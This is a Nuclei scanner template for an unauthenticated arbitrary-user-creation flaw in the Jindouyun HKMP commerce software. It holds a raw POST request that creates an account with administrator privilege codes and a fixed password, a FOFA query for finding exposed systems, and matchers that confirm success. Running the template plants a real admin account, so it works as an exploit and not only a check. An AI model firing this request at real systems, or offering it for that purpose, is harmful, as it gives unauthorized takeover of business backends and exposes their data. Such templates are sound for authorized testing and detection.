http:
    - matchers:
        - part: body
          type: word
          words:
            - 用户添加成功
            - 用户名已存在
        - status:
            - 200
          type: status
      matchers-condition: and
      raw:
        - |
          POST /admin/user/add HTTP/1.1
          Host: {{Hostname}}
          Content-Type: application/json;charset=UTF-8

          {"appId":"hkmp","mchId":"hkmp","deviceId":"hkmp","timestamp":1719305067,"nonce":5223015867,"sign":"hkmp","data":{"userCode":"{{username}}","userName":"{{username}}","password":"123456","privilege":["1000","8000","8010","2000","2001","2010","7000"],"adminUserCode":"admin","adminUserName":"系统管理员"}}
id: jindouyun-HKMP-User-addition
info:
    author: Superhero
    description: |-
        fofa: body="金斗云 Copyright"
        金斗云 HKMP智慧商业软件 /admin/user/add 接口存在任意用户创建漏洞，未经身份验证的远程攻击者可以利用此漏洞创建管理员账户，从而接管系统后台，造成信息泄露，导致系统处于极不安全的状态。
    name: 金斗云 HKMP智慧商业软件 任意用户创建漏洞
    reference:
        - https://blog.csdn.net/m0_60571842/article/details/140161975
    severity: high
    tags:
        - User addition
variables:
    username: '{{to_lower(rand_base(6))}}'
